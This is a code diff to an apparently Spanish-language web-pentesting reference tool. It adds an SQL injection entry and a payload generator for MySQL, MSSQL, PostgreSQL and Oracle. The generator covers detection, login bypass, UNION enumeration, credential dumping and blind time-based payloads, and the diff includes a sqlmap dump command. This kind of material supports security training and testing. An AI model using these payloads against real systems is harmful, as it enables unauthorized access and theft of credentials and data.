@@ -4513,6 +4513,13 @@ const WEB_VULNS=[
     ],
     note:'💡 Pruébalo con DOS cuentas: pide un recurso con la cuenta A y accede a ese id logueado como B. Si lo ves, es IDOR. Un UUID no te salva si se filtra en otra respuesta.',
   },
+  {
+    id:'sqli', owasp:'A03', generator:true, icon:'💉', name:'SQL Injection', tag:'Injection',
+    sub:'Inyección en consultas SQL — de bypass de login a volcado completo de la BD.',
+    desc:'La aplicación construye una consulta SQL concatenando entrada del usuario sin parametrizar. Permite alterar la consulta: saltarse el login, extraer datos de otras tablas (UNION), o inferir datos poco a poco cuando no hay salida visible (blind).',
+    detection:'Meter una comilla simple en el parámetro y ver si la app da un error SQL o cambia de comportamiento. Confirmar con lógica booleana (AND 1=1 frente a AND 1=2).',
+    note:'💡 Cuando lo manual se queda corto, automatiza con sqlmap: sqlmap -u "http://objetivo/pagina?id=1" --batch --dbs, y luego -D basedatos --tables y --dump.',
+  },
 ];
 
 function renderWebVulnList(){
@@ -4570,6 +4577,68 @@ function wvPayloadCard(code, desc){
   </div>`;
 }
 
+// ─── Generador SQLi (motor de BD + categorías, blind y enumeración) ───────────
+const SQLI_CATS=[
+  {id:'detect', label:'Detección'},
+  {id:'login',  label:'Bypass login'},
+  {id:'union',  label:'UNION'},
+  {id:'enum',   label:'Enumeración BD'},
+  {id:'bool',   label:'Blind booleano'},
+  {id:'time',   label:'Blind time'},
+];
+const SQLI_DB={
+  mysql:   {name:'MySQL/MariaDB', c:'-- -', ver:'@@version',  timeInj:"' AND SLEEP(5)-- -"},
+  mssql:   {name:'MSSQL',         c:'--',   ver:'@@version',  timeInj:"'; WAITFOR DELAY '0:0:5'--"},
+  postgres:{name:'PostgreSQL',    c:'--',   ver:'version()',  timeInj:"'; SELECT pg_sleep(5)--"},
+  oracle:  {name:'Oracle',        c:'--',   ver:'banner',     timeInj:"' AND 1=dbms_pipe.receive_message('a',5)--"},
+};
+function sqliPayloads(dbms, cat){
+  const db=SQLI_DB[dbms]||SQLI_DB.mysql; const c=db.c, v=db.ver;
+  switch(cat){
+    case 'detect': return [
+      {code:"'",              d:'Comilla simple — si da error SQL o cambia la respuesta, es candidato'},
+      {code:"''",             d:'Dos comillas — si el error desaparece, confirma inyección de cadena'},
+      {code:`' AND 1=1${c}`,  d:'Condición verdadera — la app responde con normalidad'},
+      {code:`' AND 1=2${c}`,  d:'Condición falsa — si responde distinto, hay inyección'},
+    ];
+    case 'login': return [
+      {code:`' OR 1=1${c}`,   d:'Condición siempre verdadera y comenta el resto de la query'},
+      {code:`admin'${c}`,     d:'Entra como admin comentando la comprobación de contraseña'},
+      {code:"' OR '1'='1",    d:'Bypass clásico sin comentario — cierra la comilla abierta'},
+    ];
+    case 'union': return [
+      {code:`' ORDER BY 1${c}`,          d:'Sube el número hasta que dé error: son las columnas de la query'},
+      {code:`' UNION SELECT NULL${c}`,   d:'Añade NULLs hasta que no dé error (mismo nº de columnas)'},
+      {code:`' UNION SELECT ${v},NULL${c}`, d:'Coloca la versión en una columna visible (ajusta los NULLs)'},
+    ];
+    case 'enum': return dbms==='oracle' ? [
+      {code:`' UNION SELECT table_name,NULL FROM all_tables${c}`, d:'Listar tablas (Oracle no usa information_schema)'},
+      {code:`' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USUARIOS'${c}`, d:'Columnas de una tabla'},
+    ] : [
+      {code:`' UNION SELECT table_name,NULL FROM information_schema.tables${c}`, d:'Listar todas las tablas de la BD'},
+      {code:`' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='usuarios'${c}`, d:'Listar columnas de una tabla'},
+      {code:`' UNION SELECT usuario,contrasena FROM usuarios${c}`, d:'Volcar credenciales una vez conoces tabla y columnas'},
+    ];
+    case 'bool': return [
+      {code:`' AND SUBSTRING((SELECT ${v}),1,1)='5${c}`, d:'Inferir datos carácter a carácter según la respuesta (Oracle: SUBSTR)'},
+      {code:`' AND (SELECT COUNT(*) FROM information_schema.tables)>10${c}`, d:'Preguntar sí/no sobre la BD observando el cambio de respuesta'},
+    ];
+    case 'time': return [
+      {code:db.timeInj, d:'Si la respuesta tarda ~5s, la inyección es válida (útil cuando no hay salida visible)'},
+    ];
+  }
+  return [];
+}
+let _sqliCat='detect';
+function setSqliCat(c){ _sqliCat=c; renderSqliGen(); }
+function renderSqliGen(){
+  const dbms=document.getElementById('sqliDbms')?.value||'mysql';
+  const btns=document.getElementById('sqliCatBtns');
+  if(btns) btns.innerHTML=SQLI_CATS.map(cat=>`<button class="enum-toggle ${cat.id===_sqliCat?'active':''}" onclick="setSqliCat('${cat.id}')">${esc(cat.label)}</button>`).join('');
+  const out=document.getElementById('sqliGenOut');
+  if(out) out.innerHTML=sqliPayloads(dbms,_sqliCat).map(p=>wvPayloadCard(p.code,p.d)).join('');
+}
+
 function openWebVuln(id){
   const v=WEB_VULNS.find(x=>x.id===id);
   if(!v) return;
@@ -4587,6 +4656,26 @@ function openWebVuln(id){
 
   html+=`<div class="wv-sec"><div class="wv-sec-title desc">Descripción</div><div class="wv-desc-txt">${esc(v.desc)}</div></div>`;
   html+=`<div class="wv-sec"><div class="wv-sec-title det">Cómo detectarla</div><div class="wv-desc-txt">${esc(v.detection)}</div></div>`;
+
+  if(v.generator){
+    html+=`<div class="wv-sec"><div class="wv-sec-title pay">Generador de payloads</div>
+      <div class="enum-generator">
+        <div class="enum-gen-row">
+          <span class="enum-gen-label">Motor de BD</span>
+          <select class="enum-gen-sel" id="sqliDbms" onchange="renderSqliGen()">
+            <option value="mysql">MySQL / MariaDB</option>
+            <option value="mssql">MSSQL</option>
+            <option value="postgres">PostgreSQL</option>
+            <option value="oracle">Oracle</option>
+          </select>
+        </div>
+        <div class="enum-gen-row" style="align-items:flex-start;">
+          <span class="enum-gen-label">Objetivo</span>
+          <div id="sqliCatBtns" class="enum-toggle-row" style="margin:0;"></div>
+        </div>
+        <div id="sqliGenOut" style="margin-top:8px;"></div>
+      </div></div>`;
+  }
 
   if(v.engineTable){
     html+=`<div class="wv-sec"><div class="wv-sec-title det">Identificación de motor</div>
@@ -4616,6 +4705,7 @@ function openWebVuln(id){
   }
 
   d.innerHTML=html;
+  if(v.generator){ _sqliCat='detect'; renderSqliGen(); }
 }
 
 // ─── SSTI ENGINE IDENTIFIER ───────────────────────────────────────────────────
